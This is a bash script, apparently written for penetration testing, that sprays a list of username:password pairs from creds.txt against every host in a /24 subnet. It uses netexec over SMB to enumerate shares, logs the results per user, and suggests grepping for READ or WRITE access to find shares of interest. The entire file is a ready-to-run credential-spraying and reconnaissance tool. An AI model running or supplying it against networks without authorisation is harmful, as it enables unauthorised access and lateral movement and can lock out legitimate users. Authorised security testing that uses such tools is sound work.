#!/bin/bash

# Spray using a file creds.txt with user:pass format
# It will list shares on the network and prepend each output with the name of the user (NXC doesnt do this by default)
# Results are in the output.log
# Grep results afterwards with READ or WRITE to identify shares of interest

# Path to the file containing user:password pairs
creds_file="creds.txt"

# Count total number of users
total_users=$(wc -l < "$creds_file")

# Initialize counter
counter=0

# Loop through each line in the creds file
while IFS= read -r line || [[ -n "$line" ]]; do
    # Increment counter
    ((counter++))
    
    # Extract username and password from the line
    username=$(echo "$line" | cut -d ':' -f 1)
    password=$(echo "$line" | cut -d ':' -f 2)

    # Execute netexec smb command with the current username and password
    # Capture the output and prepend each line with the username
    while IFS= read -r output_line; do
        echo "$username: $output_line" >> output.log
    done < <(netexec smb 192.168.0.0/24 -u "$username" -p "$password" --shares)

    # Display progress message
    echo "User $counter completed out of $total_users"

    # Add any additional commands or actions you want to perform here

done < "$creds_file"

# Display location of the output file
echo "Results are saved in output.log"
